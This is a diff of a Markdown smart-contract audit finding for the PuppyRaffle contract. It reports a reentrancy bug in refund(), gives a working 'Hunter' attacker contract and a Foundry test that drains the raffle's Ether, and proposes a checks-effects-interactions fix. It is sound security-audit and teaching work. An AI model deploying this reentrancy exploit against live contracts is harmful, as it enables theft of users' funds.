@@ -16,22 +16,22 @@ The `PuppyRaffle::refund()` can be re-entered because it does not follow the `CE
 <summary>Code</summary>
 
     ```solidity
-    /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
-    /// @dev This function will allow there to be blank spots in the array
-    function refund(uint256 playerIndex) public {
-        address playerAddress = players[playerIndex];
-        // checks 👇🏾
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+        /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
+        /// @dev This function will allow there to be blank spots in the array
+        function refund(uint256 playerIndex) public {
+            address playerAddress = players[playerIndex];
+            // checks 👇🏾
+            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
 
-        // interaction 👇🏾
-        payable(msg.sender).sendValue(entranceFee);
+            // interaction 👇🏾
+            payable(msg.sender).sendValue(entranceFee);
 
-        // effects (state updates) 👇🏾
-        players[playerIndex] = address(0);
+            // effects (state updates) 👇🏾
+            players[playerIndex] = address(0);
 
-        emit RaffleRefunded(playerAddress);
-    }
+            emit RaffleRefunded(playerAddress);
+        }
     ```
 </details>
 
@@ -40,61 +40,61 @@ If the caller of the `PuppyRaffle::refund()` function is a contract with a `rece
 
 #### Proof of Concept:
 
-- Create a `Hunter` contract 👇🏾:
+Create a `Hunter` contract 👇🏾:
 
 <details>
 <summary>Hunter</summary>
 
     ```solidity
-    // SPDX-License-Identifier: MIT
-    pragma solidity ^0.7.6;
+        // SPDX-License-Identifier: MIT
+        pragma solidity ^0.7.6;
 
-    import {PuppyRaffle} from "./PuppyRaffle.sol";
+        import {PuppyRaffle} from "./PuppyRaffle.sol";
 
-    contract Hunter {
-        PuppyRaffle puppy;
-        address hunter = address(this);
+        contract Hunter {
+            PuppyRaffle puppy;
+            address hunter = address(this);
 
-        constructor(PuppyRaffle _puppy) {
-            puppy = _puppy;
-        }
+            constructor(PuppyRaffle _puppy) {
+                puppy = _puppy;
+            }
 
-        function poach() public payable {
-            require(msg.value == puppy.entranceFee());
+            function poach() public payable {
+                require(msg.value == puppy.entranceFee());
 
-            // create a dynamic array, and push the Hunter's address
-            address[] memory players = new address[](1);
-            players[0] = hunter; // address(this) is the address of this contract, which is the Hunter contract
+                // create a dynamic array, and push the Hunter's address
+                address[] memory players = new address[](1);
+                players[0] = hunter; // address(this) is the address of this contract, which is the Hunter contract
 
-            // enter raffle
-            puppy.enterRaffle{value: msg.value}(players);
+                // enter raffle
+                puppy.enterRaffle{value: msg.value}(players);
 
-            // find index of the Hunter's address
-            uint256 hunterIndex = puppy.getActivePlayerIndex(hunter);
+                // find index of the Hunter's address
+                uint256 hunterIndex = puppy.getActivePlayerIndex(hunter);
 
-            // refund hunter
-            puppy.refund(hunterIndex);
-        }
-
-        receive() external payable {
-            // find index of the Hunter's address
-            uint256 hunterIndex = puppy.getActivePlayerIndex(hunter);
-
-            if (address(puppy).balance >= 1e18) {
+                // refund hunter
                 puppy.refund(hunterIndex);
             }
+
+            receive() external payable {
+                // find index of the Hunter's address
+                uint256 hunterIndex = puppy.getActivePlayerIndex(hunter);
+
+                if (address(puppy).balance >= 1e18) {
+                    puppy.refund(hunterIndex);
+                }
+            }
         }
-    }
 
     ```
 </details>
 
-- Modify `PuppyRaffleTest.t.sol` contract 👇🏾:
+Modify `PuppyRaffleTest.t.sol` test contract 👇🏾:
   
 <details>
 <summary>PuppyRaffleTest</summary>
 
-    ```diff
+````diff
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.7.6;
     pragma experimental ABIEncoderV2;
@@ -120,8 +120,76 @@ If the caller of the `PuppyRaffle::refund()` function is a contract with a `rece
 +           hunter = new Hunter(puppyRaffle);
         }
     }
+````
+</details>
+
+Add the following test 👇🏾:
+
+<details>
+<summary>Code</summary>
+
+    ```solidity
+        function testHunterReentrancyAttackSuccessful() public {
+            address[] memory players = new address[](5);
+            players[0] = playerOne;
+            players[1] = playerTwo;
+            players[2] = playerThree;
+            players[3] = playerFour;
+            players[4] = address(hunter);
+            puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
+
+            console.log(address(puppyRaffle).balance);
+            assert(address(puppyRaffle).balance == 5e18);
+
+            // attack logic
+            uint256 hunterIndex = puppyRaffle.getActivePlayerIndex(address(hunter));
+            // hunter attacks
+            vm.prank(address(hunter));
+            puppyRaffle.refund(hunterIndex);
+
+            // assert PuppyRaffle's contract has been drained
+            assert(address(puppyRaffle).balance == 0);
+            // assert Hunter's balance has increased more than expected
+            assert(address(hunter).balance == 5e18);
+        }
     ```
 </details>
+
+#### Tools Used:
+
+- Foundry
+- Slither
+- Manual Review
+- Remix
+- Chat GPT
+
+#### Recommended Mitigation:
+
+Re-arrange the `PuppyRaffle:refund()` fund to follow `CEI` pattern:
+
+<details>
+<summary>Code</summary>
+
+    ```solidity
+        /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
+        /// @dev This function will allow there to be blank spots in the array
+        function refund(uint256 playerIndex) public {
+            address playerAddress = players[playerIndex];
+            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+            // Update state before sending Ether
+            players[playerIndex] = address(0);
+
+            // Now transfer the refund
+            payable(msg.sender).sendValue(entranceFee);
+
+            emit RaffleRefunded(playerAddress);
+        }
+    ```
+</details>
+
+Also the `nonReentrant` modifier from [OpenZeppelin `ReentrancyGuard`](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) could be used.
 
 -----------------------------------------------------------------
 
